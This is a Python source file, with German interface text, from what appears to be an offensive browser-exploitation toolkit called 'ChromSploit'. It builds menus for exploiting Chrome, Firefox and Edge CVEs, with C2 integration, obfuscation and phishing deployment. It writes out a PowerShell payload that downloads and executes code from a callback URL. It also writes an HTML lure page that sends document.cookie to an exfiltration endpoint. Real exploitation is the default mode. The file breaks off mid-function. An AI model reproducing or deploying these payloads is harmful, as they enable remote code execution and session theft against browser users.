#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework v2.0
CVE-Menü-Implementierung
Für Bildungs- und autorisierte Penetrationstests
"""

import os
import sys
import time
import json
import subprocess
from typing import Optional, Dict, Any, List

from core.colors import Colors
from core.menu import Menu
from core.config import Config
from core.logger import Logger
from core.utils import Utils
from core.path_utils import PathUtils
from core.ngrok_manager import get_ngrok_manager
from core.module_loader import get_module_loader

class CVEMenu(Menu):
    """
    Menü für CVE-spezifische Exploits
    """
    
    def __init__(self, cve_id: str, description: str, parent=None):
        """
        Initialisiert das CVE-Menü
        
        Args:
            cve_id (str): Die CVE-ID (z.B. 'cve_2025_4664')
            description (str): Die Beschreibung der CVE
            parent (Menu, optional): Das übergeordnete Menü
        """
        super().__init__(f"{cve_id.upper()} - {description}", parent)
        
        self.cve_id = cve_id
        self.description = description
        self.exploit_path = os.path.join(PathUtils.get_exploits_dir(), cve_id)
        
        # Informationstext basierend auf der CVE-ID setzen
        self._set_cve_info()
        
        # Menüeinträge hinzufügen
        self.add_item("Quick Exploit (Auto-Konfiguration)", self._quick_exploit, Colors.BRIGHT_GREEN)
        self.add_item("Erweiterte Exploit-Konfiguration", self._advanced_config, Colors.BRIGHT_BLUE)
        self.add_item("Payload generieren", self._generate_payload, Colors.BRIGHT_YELLOW)
        self.add_item("C2-Framework integrieren", self._integrate_c2, Colors.BRIGHT_MAGENTA)
        self.add_item("Exploit obfuskieren", self._obfuscate_exploit, Colors.BRIGHT_CYAN)
        self.add_item("Phishing-Website bereitstellen", self._deploy_phishing, Colors.BRIGHT_GREEN)
        self.add_item("Exploit testen (Simulation)", self._test_exploit, Colors.BRIGHT_WHITE)
        self.add_item("Exploit-Paket exportieren", self._export_package, Colors.ORANGE)
        self.add_item("Exploit-Dokumentation anzeigen", self._show_documentation, Colors.PURPLE)
        self.add_item("Zurück zum Hauptmenü", lambda: "exit", Colors.BRIGHT_RED)
    
    def _set_cve_info(self) -> None:
        """
        Setzt den Informationstext basierend auf der CVE-ID
        """
        if self.cve_id == "cve_2025_4664":
            self.set_info_text(
                "Chrome Data Leak (CVE-2025-4664): Ausnutzung einer Schwachstelle im Link-Header-Parser von Chrome, "
                "die es ermöglicht, Cross-Origin-Daten über den Referer-Header zu exfiltrieren."
            )
        elif self.cve_id == "cve_2025_2783":
            self.set_info_text(
                "Chrome Mojo Sandbox Escape (CVE-2025-2783): Ausnutzung einer Schwachstelle im Mojo IPC-System von Chrome, "
                "die es ermöglicht, aus der Sandbox auszubrechen und Befehle mit erhöhten Rechten auszuführen."
            )
        elif self.cve_id == "cve_2025_2857":
            self.set_info_text(
                "Firefox Sandbox Escape (CVE-2025-2857): Ausnutzung einer Handle-Confusion-Schwachstelle im IPDL-System von Firefox, "
                "die es ermöglicht, aus der Sandbox auszubrechen und Prozesse mit PROCESS_ALL_ACCESS-Rechten zu manipulieren."
            )
        elif self.cve_id == "cve_2025_30397":
            self.set_info_text(
                "Edge WebAssembly JIT Escape (CVE-2025-30397): Ausnutzung einer Schwachstelle im WebAssembly-JIT-Compiler von Edge, "
                "die es ermöglicht, Bounds-Checks zu umgehen und Heap-Corruption zu verursachen."
            )
    
    def _get_ngrok_url(self, protocol: str = "https") -> str:
        """
        Get the first available ngrok tunnel URL of the specified protocol
        
        Args:
            protocol: The protocol to look for (http/https/tcp)
            
        Returns:
            str: The ngrok URL or a placeholder if none found
        """
        try:
            ngrok_manager = get_ngrok_manager()
            tunnels = ngrok_manager.get_active_tunnels()
            
            for tunnel in tunnels:
                if tunnel.public_url.startswith(protocol):
                    return tunnel.public_url
                    
            # If no specific protocol found, return the first tunnel
            if tunnels:
                return tunnels[0].public_url
                
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Konnte ngrok-Status nicht abrufen: {str(e)}{Colors.RESET}")
        
        # Fallback to manual input
        manual_url = input(f"\n{Colors.BRIGHT_CYAN}Bitte geben Sie die ngrok-URL ein: {Colors.RESET}")
        return manual_url if manual_url else "https://placeholder.ngrok.io"
    
    def _execute_cve_exploit(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """
        Execute the actual CVE exploit
        
        Args:
            parameters: Exploit parameters
            
        Returns:
            Dict with execution results
        """
        try:
            # Load the exploit module
            module_loader = get_module_loader()
            exploit_module = module_loader.load_module(f"exploits.{self.cve_id}")
            
            if not exploit_module:
                return {
                    'success': False,
                    'error': f"Could not load exploit module for {self.cve_id}"
                }
            
            # Check if in simulation mode
            if parameters.get('simulation_mode', False):
                print(f"{Colors.YELLOW}[!] Simulation mode active - no actual exploitation{Colors.RESET}")
                return {
                    'success': True,
                    'cve_id': self.cve_id,
                    'simulated': True,
                    'message': 'Exploit would be executed in real mode'
                }
            
            # Execute the exploit
            if hasattr(exploit_module, 'execute_exploit'):
                result = exploit_module.execute_exploit(parameters)
            else:
                # Try to instantiate the exploit class and execute
                exploit_class_name = f"CVE{self.cve_id.split('_')[1]}_{self.cve_id.split('_')[2]}_Exploit"
                if hasattr(exploit_module, exploit_class_name):
                    exploit_class = getattr(exploit_module, exploit_class_name)
                    exploit = exploit_class()
                    
                    # Set parameters
                    for key, value in parameters.items():
                        if hasattr(exploit, 'set_parameter'):
                            exploit.set_parameter(key, value)
                    
                    # Execute
                    result = exploit.execute(parameters.get('target_url'))
                else:
                    return {
                        'success': False,
                        'error': f"No executable exploit found in module {self.cve_id}"
                    }
            
            return result
            
        except Exception as e:
            print(f"{Colors.RED}[!] Exploit execution failed: {str(e)}{Colors.RESET}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _quick_exploit(self) -> None:
        """
        Führt einen schnellen Exploit mit automatischer Konfiguration durch
        """
        self._clear()
        self._draw_box(80, f"QUICK EXPLOIT - {self.cve_id.upper()}")
        
        print(f"\n{Colors.CYAN}[*] Starte automatische Konfiguration für {self.cve_id.upper()}...{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Erkenne Umgebung und optimale Parameter...{Colors.RESET}")
        
        # Hier würde die automatische Konfiguration implementiert werden
        time.sleep(1)
        
        # Beispielhafte Konfiguration
        config = {
            "target_browser": "chrome" if "chrome" in self.cve_id else "firefox" if "firefox" in self.cve_id else "edge",
            "target_os": "windows",
            "payload_type": "powershell",
            "obfuscation_level": 2,
            "c2_framework": "sliver",
            "listen_port": 8443,
            "use_ngrok": True
        }
        
        print(f"\n{Colors.BRIGHT_WHITE}Automatisch erkannte Konfiguration:{Colors.RESET}")
        for key, value in config.items():
            print(f"  {Colors.GREEN}{key}:{Colors.RESET} {value}")
        
        confirm = input(f"\n{Colors.BRIGHT_CYAN}Mit dieser Konfiguration fortfahren? [J/n]: {Colors.RESET}")
        if confirm.lower() not in ['', 'j', 'ja', 'y', 'yes']:
            print(f"\n{Colors.YELLOW}[!] Abgebrochen. Wechsle zu erweiterter Konfiguration...{Colors.RESET}")
            time.sleep(1)
            return self._advanced_config()
        
        print(f"\n{Colors.CYAN}[*] Starte Exploit-Ausführung mit automatischer Konfiguration...{Colors.RESET}")
        
        # Prepare exploit parameters
        exploit_params = {
            'kali_ip': Utils.get_ip_address(),
            'port': config.get('listen_port', 8443),
            'target_url': config.get('target_url', 'http://target.local'),
            'callback_url': self._get_ngrok_url() if config.get('use_ngrok') else f"http://{Utils.get_ip_address()}:{config.get('listen_port', 8443)}",
            'simulation_mode': False  # Set to True for testing
        }
        
        # Execute the actual exploit
        print(f"{Colors.BLUE}[+] Lade Exploit-Modul...{Colors.RESET}")
        result = self._execute_cve_exploit(exploit_params)
        
        if result.get('success'):
            print(f"{Colors.GREEN}[✓] Exploit erfolgreich geladen{Colors.RESET}")
            
            # Display results
            print(f"\n{Colors.BRIGHT_GREEN}[✓] Exploit erfolgreich ausgeführt!{Colors.RESET}")
            print(f"\n{Colors.BRIGHT_WHITE}Ergebnisse:{Colors.RESET}")
            
            if 'payload_path' in result:
                print(f"  {Colors.GREEN}Payload:{Colors.RESET} {result['payload_path']}")
            
            if 'server_url' in result:
                print(f"  {Colors.GREEN}Server URL:{Colors.RESET} {result['server_url']}")
            
            print(f"  {Colors.GREEN}C2-URL:{Colors.RESET} {exploit_params['callback_url']}")
            
            if 'instructions' in result:
                print(f"\n{Colors.BRIGHT_YELLOW}Anweisungen:{Colors.RESET}")
                for instruction in result['instructions']:
                    print(f"  {Colors.YELLOW}• {instruction}{Colors.RESET}")
            
            # Save artifacts
            if 'artifacts' in result:
                artifacts_dir = os.path.join(PathUtils.get_output_dir(), self.cve_id, "artifacts")
                PathUtils.ensure_dir_exists(artifacts_dir)
                for name, data in result.get('artifacts', {}).items():
                    artifact_path = os.path.join(artifacts_dir, name)
                    with open(artifact_path, 'w') as f:
                        json.dump(data, f, indent=2)
                    print(f"  {Colors.GREEN}Artifact saved:{Colors.RESET} {artifact_path}")
            
            # Check for new sessions if exploit was successful
            print(f"\n{Colors.CYAN}[*] Prüfe auf neue Sessions...{Colors.RESET}")
            time.sleep(2)
            
            try:
                from modules.session_manager import get_session_manager
                session_manager = get_session_manager()
                
                # Get current sessions
                current_sessions = session_manager.get_all_sessions()
                active_count = len(current_sessions)
                
                if active_count > 0:
                    print(f"{Colors.GREEN}[+] {active_count} aktive Session(s) gefunden!{Colors.RESET}")
                    
                    # Show recent sessions
                    print(f"\n{Colors.CYAN}Neueste Sessions:{Colors.RESET}")
                    for session in current_sessions[:3]:  # Show max 3 sessions
                        session_key = f"{session.framework}_{session.id}"
                        user_host = f"{session.username}@{session.hostname}"
                        print(f"  • {Colors.YELLOW}{session_key}{Colors.RESET} - {user_host} ({session.target_ip})")
                    
                    # Ask if user wants to open session management
                    open_sessions = input(f"\n{Colors.BRIGHT_CYAN}Session Management öffnen? [J/n]: {Colors.RESET}")
                    if open_sessions.lower() not in ['n', 'nein', 'no']:
                        try:
                            from ui.session_menu import SessionMenu
                            session_menu = SessionMenu()
                            session_menu.run()
                        except ImportError:
                            print(f"{Colors.YELLOW}[!] Session Management Menu nicht verfügbar{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[!] Keine aktiven Sessions gefunden{Colors.RESET}")
                    print(f"{Colors.CYAN}[*] Stellen Sie sicher, dass C2-Frameworks laufen und auf Callbacks warten{Colors.RESET}")
                    
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Session-Check nicht verfügbar: {str(e)}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[!] Exploit fehlgeschlagen: {result.get('error', 'Unknown error')}{Colors.RESET}")
        
        input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
    
    def _advanced_config(self) -> None:
        """
        Zeigt die erweiterte Konfiguration für den Exploit an
        """
        self._clear()
        self._draw_box(80, f"ERWEITERTE KONFIGURATION - {self.cve_id.upper()}")
        
        print(f"\n{Colors.BRIGHT_WHITE}Konfigurieren Sie den Exploit nach Ihren Anforderungen:{Colors.RESET}\n")
        
        # Ziel-Browser
        print(f"{Colors.BRIGHT_BLUE}Ziel-Browser:{Colors.RESET}")
        browsers = {
            "1": "Chrome",
            "2": "Firefox",
            "3": "Edge",
            "4": "Safari"
        }
        for key, browser in browsers.items():
            print(f"  {key}) {browser}")
        
        browser_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie den Ziel-Browser [1]: {Colors.RESET}")
        browser = browsers.get(browser_choice, browsers["1"])
        
        # Ziel-Betriebssystem
        print(f"\n{Colors.BRIGHT_BLUE}Ziel-Betriebssystem:{Colors.RESET}")
        os_choices = {
            "1": "Windows 10/11",
            "2": "Linux",
            "3": "macOS"
        }
        for key, os_name in os_choices.items():
            print(f"  {key}) {os_name}")
        
        os_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie das Ziel-Betriebssystem [1]: {Colors.RESET}")
        target_os = os_choices.get(os_choice, os_choices["1"])
        
        # Payload-Typ
        print(f"\n{Colors.BRIGHT_BLUE}Payload-Typ:{Colors.RESET}")
        payload_types = {
            "1": "PowerShell",
            "2": "EXE",
            "3": "DLL",
            "4": "Python",
            "5": "JavaScript"
        }
        for key, payload_type in payload_types.items():
            print(f"  {key}) {payload_type}")
        
        payload_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie den Payload-Typ [1]: {Colors.RESET}")
        payload = payload_types.get(payload_choice, payload_types["1"])
        
        # Obfuskierungslevel
        print(f"\n{Colors.BRIGHT_BLUE}Obfuskierungslevel:{Colors.RESET}")
        obfuscation_levels = {
            "1": "Niedrig - Grundlegende Obfuskierung",
            "2": "Mittel - Erweiterte Obfuskierung",
            "3": "Hoch - Vollständige Obfuskierung mit Anti-VM"
        }
        for key, level in obfuscation_levels.items():
            print(f"  {key}) {level}")
        
        obfuscation_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie das Obfuskierungslevel [2]: {Colors.RESET}")
        obfuscation = obfuscation_choice if obfuscation_choice in ["1", "2", "3"] else "2"
        
        # C2-Framework
        print(f"\n{Colors.BRIGHT_BLUE}C2-Framework:{Colors.RESET}")
        c2_frameworks = {
            "1": "Sliver",
            "2": "Metasploit",
            "3": "Custom HTTP C2",
            "4": "Keines"
        }
        for key, framework in c2_frameworks.items():
            print(f"  {key}) {framework}")
        
        c2_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie das C2-Framework [1]: {Colors.RESET}")
        c2_framework = c2_frameworks.get(c2_choice, c2_frameworks["1"])
        
        # Ngrok verwenden
        use_ngrok = input(f"\n{Colors.BRIGHT_CYAN}Ngrok für externe Erreichbarkeit verwenden? [J/n]: {Colors.RESET}")
        use_ngrok = use_ngrok.lower() not in ['n', 'nein', 'no']
        
        # Konfiguration zusammenfassen
        print(f"\n{Colors.BRIGHT_WHITE}Zusammenfassung der Konfiguration:{Colors.RESET}")
        print(f"  {Colors.GREEN}Ziel-Browser:{Colors.RESET} {browser}")
        print(f"  {Colors.GREEN}Ziel-Betriebssystem:{Colors.RESET} {target_os}")
        print(f"  {Colors.GREEN}Payload-Typ:{Colors.RESET} {payload}")
        print(f"  {Colors.GREEN}Obfuskierungslevel:{Colors.RESET} {obfuscation}")
        print(f"  {Colors.GREEN}C2-Framework:{Colors.RESET} {c2_framework}")
        print(f"  {Colors.GREEN}Ngrok verwenden:{Colors.RESET} {'Ja' if use_ngrok else 'Nein'}")
        
        confirm = input(f"\n{Colors.BRIGHT_CYAN}Exploit mit dieser Konfiguration ausführen? [J/n]: {Colors.RESET}")
        if confirm.lower() not in ['', 'j', 'ja', 'y', 'yes']:
            print(f"\n{Colors.YELLOW}[!] Exploit-Ausführung abgebrochen.{Colors.RESET}")
            time.sleep(1)
            return
        
        # Hier würde die eigentliche Exploit-Ausführung implementiert werden
        print(f"\n{Colors.CYAN}[*] Führe Exploit mit benutzerdefinierter Konfiguration aus...{Colors.RESET}")
        
        steps = [
            ("Payload generieren", 2),
            ("C2-Framework konfigurieren", 1),
            ("Exploit vorbereiten", 1),
            ("Ngrok-Tunnel einrichten" if use_ngrok else "Lokalen Listener starten", 2),
            ("Exploit ausführen", 3)
        ]
        
        for step, duration in steps:
            print(f"{Colors.BLUE}[+] {step}...{Colors.RESET}")
            time.sleep(duration)
            print(f"{Colors.GREEN}[✓] {step} abgeschlossen{Colors.RESET}")
        
        print(f"\n{Colors.BRIGHT_GREEN}[✓] Exploit erfolgreich ausgeführt!{Colors.RESET}")
        print(f"\n{Colors.BRIGHT_WHITE}Ergebnisse:{Colors.RESET}")
        payload_path = os.path.join(PathUtils.get_output_dir(), self.cve_id, f"payload.{payload.lower()}")
        print(f"  {Colors.GREEN}Payload:{Colors.RESET} {payload_path}")
        
        if use_ngrok:
            ngrok_url = self._get_ngrok_url()
            print(f"  {Colors.GREEN}C2-URL:{Colors.RESET} {ngrok_url}")
        else:
            print(f"  {Colors.GREEN}C2-URL:{Colors.RESET} http://{Utils.get_ip_address()}:8443")
        
        print(f"  {Colors.GREEN}Listener:{Colors.RESET} Aktiv auf Port 8443")
        
        input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
    
    def _generate_payload(self) -> None:
        """
        Generiert einen Payload für den Exploit
        """
        self._clear()
        self._draw_box(80, f"PAYLOAD GENERIEREN - {self.cve_id.upper()}")
        
        print(f"\n{Colors.BRIGHT_WHITE}Wählen Sie den Payload-Typ:{Colors.RESET}\n")
        
        payload_types = {
            "1": ("PowerShell One-Liner", "ps1"),
            "2": ("Ausführbare Datei (EXE)", "exe"),
            "3": ("DLL-Injektion", "dll"),
            "4": ("Python-Script", "py"),
            "5": ("JavaScript-Payload", "js"),
            "6": ("WebAssembly-Modul", "wasm"),
            "7": ("HTML-Exploit-Seite", "html")
        }
        
        for key, (name, _) in payload_types.items():
            print(f"  {key}) {name}")
        
        choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie den Payload-Typ: {Colors.RESET}")
        
        if choice not in payload_types:
            print(f"\n{Colors.RED}[!] Ungültige Auswahl.{Colors.RESET}")
            time.sleep(1)
            return
        
        payload_name, extension = payload_types[choice]
        
        print(f"\n{Colors.CYAN}[*] Generiere {payload_name}...{Colors.RESET}")
        
        # Obfuskierungslevel
        print(f"\n{Colors.BRIGHT_BLUE}Obfuskierungslevel:{Colors.RESET}")
        obfuscation_levels = {
            "1": "Niedrig - Grundlegende Obfuskierung",
            "2": "Mittel - Erweiterte Obfuskierung",
            "3": "Hoch - Vollständige Obfuskierung mit Anti-VM"
        }
        for key, level in obfuscation_levels.items():
            print(f"  {key}) {level}")
        
        obfuscation_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie das Obfuskierungslevel [2]: {Colors.RESET}")
        obfuscation = obfuscation_choice if obfuscation_choice in ["1", "2", "3"] else "2"
        
        # C2-Integration
        c2_integration = input(f"\n{Colors.BRIGHT_CYAN}C2-Framework integrieren? [J/n]: {Colors.RESET}")
        use_c2 = c2_integration.lower() not in ['n', 'nein', 'no']
        
        if use_c2:
            print(f"\n{Colors.BRIGHT_BLUE}C2-Framework:{Colors.RESET}")
            c2_frameworks = {
                "1": "Sliver",
                "2": "Metasploit",
                "3": "Custom HTTP C2"
            }
            for key, framework in c2_frameworks.items():
                print(f"  {key}) {framework}")
            
            c2_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie das C2-Framework [1]: {Colors.RESET}")
            c2_framework = c2_frameworks.get(c2_choice, c2_frameworks["1"])
            
            # Callback-URL
            callback_url = input(f"\n{Colors.BRIGHT_CYAN}Callback-URL (leer für automatische Generierung): {Colors.RESET}")
            if not callback_url:
                callback_url = f"https://{Utils.get_ip_address()}:8443"
        
        # Ausgabepfad
        output_dir = os.path.join(PathUtils.get_output_dir(), self.cve_id)
        PathUtils.ensure_dir_exists(output_dir)
        output_file = os.path.join(output_dir, f"payload.{extension}")
        
        # Hier würde die eigentliche Payload-Generierung implementiert werden
        print(f"\n{Colors.CYAN}[*] Generiere Payload mit den angegebenen Parametern...{Colors.RESET}")
        time.sleep(2)
        
        # Get ngrok URL for payload
        c2_url = self._get_ngrok_url() if use_c2 else "http://127.0.0.1:8443"
        
        # Beispielhafte Payload-Generierung
        if extension == "ps1":
            payload_content = f"""
# ChromSploit Framework v2.0 - PowerShell Payload
# Generiert für {self.cve_id.upper()}
$ErrorActionPreference = "SilentlyContinue"
$url = "{c2_url}/callback"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$data = $wc.DownloadString($url)
Invoke-Expression $data
"""
        elif extension == "html":
            payload_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Secure Document</title>
    <meta name="referrer" content="no-referrer">
</head>
<body>
    <h1>Secure Document</h1>
    <p>Loading secure content...</p>
    <script>
        // ChromSploit Framework v2.0 - HTML Exploit
        // Generiert für {self.cve_id.upper()}
        fetch('{c2_url}/exfil', {{
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json'
            }},
            body: JSON.stringify({{
                'data': document.cookie,
                'url': window.location.href
            }})
        }});
    </script>
</body>
</html>
"""
        else:
            payload_content = f"# ChromSploit Framework v2.0 - {payload_name}\n# Generiert für {self.cve_id.upper()}\n# Obfuskierungslevel: {obfuscation}\n\n# Payload-Inhalt würde hier generiert werden"
        
        # Payload in Datei schreiben
        try:
            with open(output_file, 'w') as f:
                f.write(payload_content)
            
            print(f"\n{Colors.GREEN}[✓] Payload erfolgreich generiert: {output_file}{Colors.RESET}")
            
            # Wenn es sich um eine ausführbare Datei handelt, Berechtigungen setzen
            if extension in ["exe", "py", "sh"]:
                os.chmod(output_file, 0o755)
                print(f"{Colors.GREEN}[✓] Ausführungsrechte gesetzt{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.RED}[!] Fehler beim Generieren des Payloads: {str(e)}{Colors.RESET}")
        
        input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
    
    def _integrate_c2(self) -> None:
        """
        Integriert ein C2-Framework
        """
        self._clear()
        self._draw_box(80, f"C2-FRAMEWORK INTEGRATION - {self.cve_id.upper()}")
        
        print(f"\n{Colors.BRIGHT_WHITE}Wählen Sie das C2-Framework:{Colors.RESET}\n")
        
        c2_frameworks = {
            "1": ("Sliver C2", "Leistungsstarkes C2-Framework mit vielen Features"),
            "2": ("Metasploit Framework", "Klassisches Penetration-Testing-Framework"),
            "3": ("Custom HTTP C2", "Einfacher HTTP-basierter C2-Server"),
            "4": ("Ngrok Tunnel", "Einfache Tunneling-Lösung für externe Erreichbarkeit")
        }
        
        for key, (name, description) in c2_frameworks.items():
            print(f"  {key}) {Colors.GREEN}{name}{Colors.RESET} - {description}")
        
        choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie das C2-Framework: {Colors.RESET}")
        
        if choice not in c2_frameworks:
            print(f"\n{Colors.RED}[!] Ungültige Auswahl.{Colors.RESET}")
            time.sleep(1)
            return
        
        c2_name, _ = c2_frameworks[choice]
        
        print(f"\n{Colors.CYAN}[*] Konfiguriere {c2_name}...{Colors.RESET}")
        
        # Listener-Port
        port = input(f"\n{Colors.BRIGHT_CYAN}Listener-Port [8443]: {Colors.RESET}")
        port = port if port and port.isdigit() and 1 <= int(port) <= 65535 else "8443"
        
        # Payload-Typ
        print(f"\n{Colors.BRIGHT_BLUE}Payload-Typ:{Colors.RESET}")
        payload_types = {
            "1": "PowerShell",
            "2": "EXE",
            "3": "DLL",
            "4": "Shellcode"
        }
        for key, payload_type in payload_types.items():
            print(f"  {key}) {payload_type}")
        
        payload_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie den Payload-Typ [1]: {Colors.RESET}")
        payload = payload_types.get(payload_choice, payload_types["1"])
        
        # Externe Erreichbarkeit
        use_ngrok = input(f"\n{Colors.BRIGHT_CYAN}Ngrok für externe Erreichbarkeit verwenden? [J/n]: {Colors.RESET}")
        use_ngrok = use_ngrok.lower() not in ['n', 'nein', 'no']
        
        # Get ngrok URL if using ngrok
        ngrok_url = self._get_ngrok_url() if use_ngrok else "http://127.0.0.1:8443"
        
        # Hier würde die eigentliche C2-Integration implementiert werden
        print(f"\n{Colors.CYAN}[*] Starte {c2_name} mit den angegebenen Parametern...{Colors.RESET}")
        
        # Beispielhafte C2-Integration
        if choice == "1":  # Sliver
            print(f"{Colors.BLUE}[+] Generiere Sliver-Implant...{Colors.RESET}")
            time.sleep(2)
            print(f"{Colors.BLUE}[+] Starte Sliver-Listener auf Port {port}...{Colors.RESET}")
            time.sleep(1)
            
            if use_ngrok:
                print(f"{Colors.BLUE}[+] Starte Ngrok-Tunnel für Port {port}...{Colors.RESET}")
                time.sleep(2)
                print(f"{Colors.GREEN}[✓] Ngrok-Tunnel gestartet: {ngrok_url}{Colors.RESET}")
            
            print(f"\n{Colors.GREEN}[✓] Sliver C2 erfolgreich konfiguriert!{Colors.RESET}")
            print(f"\n{Colors.BRIGHT_WHITE}Sliver C2 Informationen:{Colors.RESET}")
            print(f"  {Colors.GREEN}Listener:{Colors.RESET} Aktiv auf Port {port}")
            payload_path = os.path.join(PathUtils.get_output_dir(), self.cve_id, f"sliver_implant.{payload.lower()}")
            print(f"  {Colors.GREEN}Implant:{Colors.RESET} {payload_path}")
            
            if use_ngrok:
                print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} {ngrok_url}")
            else:
                print(f"  {Colors.GREEN}Lokale URL:{Colors.RESET} https://{Utils.get_ip_address()}:{port}")
        
        elif choice == "2":  # Metasploit
            print(f"{Colors.BLUE}[+] Generiere Metasploit-Payload ({payload})...{Colors.RESET}")
            time.sleep(2)
            print(f"{Colors.BLUE}[+] Starte Metasploit-Handler auf Port {port}...{Colors.RESET}")
            time.sleep(1)
            
            if use_ngrok:
                print(f"{Colors.BLUE}[+] Starte Ngrok-Tunnel für Port {port}...{Colors.RESET}")
                time.sleep(2)
                print(f"{Colors.GREEN}[✓] Ngrok-Tunnel gestartet: {ngrok_url}{Colors.RESET}")
            
            print(f"\n{Colors.GREEN}[✓] Metasploit Framework erfolgreich konfiguriert!{Colors.RESET}")
            print(f"\n{Colors.BRIGHT_WHITE}Metasploit Informationen:{Colors.RESET}")
            print(f"  {Colors.GREEN}Handler:{Colors.RESET} Aktiv auf Port {port}")
            payload_path = os.path.join(PathUtils.get_output_dir(), self.cve_id, f"metasploit_payload.{payload.lower()}")
            print(f"  {Colors.GREEN}Payload:{Colors.RESET} {payload_path}")
            
            if use_ngrok:
                print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} {ngrok_url}")
            else:
                print(f"  {Colors.GREEN}Lokale URL:{Colors.RESET} https://{Utils.get_ip_address()}:{port}")
        
        elif choice == "3":  # Custom HTTP C2
            print(f"{Colors.BLUE}[+] Generiere Custom HTTP C2 Payload...{Colors.RESET}")
            time.sleep(1)
            print(f"{Colors.BLUE}[+] Starte HTTP C2 Server auf Port {port}...{Colors.RESET}")
            time.sleep(1)
            
            if use_ngrok:
                print(f"{Colors.BLUE}[+] Starte Ngrok-Tunnel für Port {port}...{Colors.RESET}")
                time.sleep(2)
                print(f"{Colors.GREEN}[✓] Ngrok-Tunnel gestartet: {ngrok_url}{Colors.RESET}")
            
            print(f"\n{Colors.GREEN}[✓] Custom HTTP C2 erfolgreich konfiguriert!{Colors.RESET}")
            print(f"\n{Colors.BRIGHT_WHITE}HTTP C2 Informationen:{Colors.RESET}")
            print(f"  {Colors.GREEN}Server:{Colors.RESET} Aktiv auf Port {port}")
            payload_path = os.path.join(PathUtils.get_output_dir(), self.cve_id, f"http_c2_payload.{payload.lower()}")
            print(f"  {Colors.GREEN}Payload:{Colors.RESET} {payload_path}")
            
            if use_ngrok:
                print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} {ngrok_url}")
            else:
                print(f"  {Colors.GREEN}Lokale URL:{Colors.RESET} http://{Utils.get_ip_address()}:{port}")
        
        elif choice == "4":  # Ngrok Tunnel
            print(f"{Colors.BLUE}[+] Starte Ngrok-Tunnel für Port {port}...{Colors.RESET}")
            time.sleep(2)
            print(f"{Colors.GREEN}[✓] Ngrok-Tunnel gestartet: {ngrok_url}{Colors.RESET}")
            
            print(f"\n{Colors.GREEN}[✓] Ngrok Tunnel erfolgreich konfiguriert!{Colors.RESET}")
            print(f"\n{Colors.BRIGHT_WHITE}Ngrok Informationen:{Colors.RESET}")
            print(f"  {Colors.GREEN}Lokaler Port:{Colors.RESET} {port}")
            print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} {ngrok_url}")
        
        input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
    
    def _obfuscate_exploit(self) -> None:
        """
        Obfuskiert den Exploit
        """
        self._clear()
        self._draw_box(80, f"EXPLOIT OBFUSKIEREN - {self.cve_id.upper()}")
        
        print(f"\n{Colors.BRIGHT_WHITE}Wählen Sie den zu obfuskierenden Exploit-Typ:{Colors.RESET}\n")
        
        exploit_types = {
            "1": ("PowerShell-Script", "ps1"),
            "2": ("Ausführbare Datei", "exe"),
            "3": ("Python-Script", "py"),
            "4": ("JavaScript-Code", "js"),
            "5": ("HTML-Exploit", "html"),
            "6": ("C/C++-Quellcode", "c")
        }
        
        for key, (name, _) in exploit_types.items():
            print(f"  {key}) {name}")
        
        choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie den Exploit-Typ: {Colors.RESET}")
        
        if choice not in exploit_types:
            print(f"\n{Colors.RED}[!] Ungültige Auswahl.{Colors.RESET}")
            time.sleep(1)
            return
        
        exploit_name, extension = exploit_types[choice]
        
        # Obfuskierungslevel
        print(f"\n{Colors.BRIGHT_BLUE}Obfuskierungslevel:{Colors.RESET}")
        obfuscation_levels = {
            "1": "Niedrig - Grundlegende Obfuskierung",
            "2": "Mittel - Erweiterte Obfuskierung",
            "3": "Hoch - Vollständige Obfuskierung mit Anti-VM"
        }
        for key, level in obfuscation_levels.items():
            print(f"  {key}) {level}")
        
        obfuscation_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie das Obfuskierungslevel [2]: {Colors.RESET}")
        obfuscation = obfuscation_choice if obfuscation_choice in ["1", "2", "3"] else "2"
        
        # Eingabedatei
        input_file = input(f"\n{Colors.BRIGHT_CYAN}Pfad zur Eingabedatei: {Colors.RESET}")
        if not input_file:
            input_file = os.path.join(PathUtils.get_output_dir(), self.cve_id, f"payload.{extension}")
        
        if not os.path.exists(input_file):
            print(f"\n{Colors.RED}[!] Eingabedatei existiert nicht: {input_file}{Colors.RESET}")
            time.sleep(1)
            return
        
        # Ausgabedatei
        output_dir = os.path.join(PathUtils.get_output_dir(), self.cve_id)
        PathUtils.ensure_dir_exists(output_dir)
        output_file = os.path.join(output_dir, f"obfuscated_payload.{extension}")
        
